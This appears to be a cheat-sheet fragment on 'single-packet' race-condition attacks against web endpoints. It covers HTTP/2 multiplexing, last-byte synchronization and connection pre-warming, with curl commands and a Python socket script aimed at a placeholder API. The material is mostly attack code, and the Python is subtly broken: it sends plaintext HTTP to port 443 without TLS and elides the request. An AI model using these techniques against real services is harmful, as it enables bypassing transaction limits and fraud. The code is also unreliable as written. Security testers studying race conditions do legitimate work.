<single_packet_attacks>
<concept>
{% raw %}
# Single-packet attack: Tight synchronization technique
# Goal: Packets arrive at same microsecond
# Maximizes race condition success rate

# Requires:
# - HTTP/2 or multiple TCP connections
# - Connection pre-warming
# - Last-byte synchronization
{% endraw %}
</concept>

<http2_multiplexing>
{% raw %}
# HTTP/2 allows multiple requests on single connection
# All requests sent in parallel streams

# Tools:
# - curl with --http2
# - h2load (HTTP/2 load testing)
# - Custom Python with hyper library

# Example with curl:
curl --http2-prior-knowledge \
  -X POST https://api.example.com/endpoint \
  -d 'data1' &
curl --http2-prior-knowledge \
  -X POST https://api.example.com/endpoint \
  -d 'data2' &

# Better: Use single HTTP/2 connection
# Send multiple requests as separate streams
{% endraw %}
</http2_multiplexing>

<last_byte_synchronization>
{% raw %}
# Technique: Hold back last byte of request
# Release all last bytes simultaneously

# Steps:
# 1. Open N TCP connections
# 2. Send all but last byte of each request
# 3. Wait for all connections ready
# 4. Send last byte of all requests simultaneously
# 5. Requests arrive at nearly same time

# Implementation:
import socket
import time

sockets = []
for i in range(10):
    s = socket.socket()
    s.connect(('api.example.com', 443))
    # Send request except last byte
    s.send(b'POST /endpoint HTTP/1.1\r\n...\r\n\r\ndata_without_last_byt')
    sockets.append(s)

# Synchronize
time.sleep(0.1)

# Send last byte to all
for s in sockets:
    s.send(b'e')
{% endraw %}
</last_byte_synchronization>

<connection_warming>
{% raw %}
# Pre-establish TCP and TLS connections
# Removes connection establishment jitter

# Steps:
# 1. Open connections
# 2. Complete TLS handshake
# 3. Send initial HTTP request (e.g., HEAD)
# 4. Keep connections alive
# 5. Use warmed connections for race attack

# Reduces timing variance from:
# - DNS resolution
# - TCP handshake
# - TLS negotiation
# - Initial routing
{% endraw %}
</connection_warming>

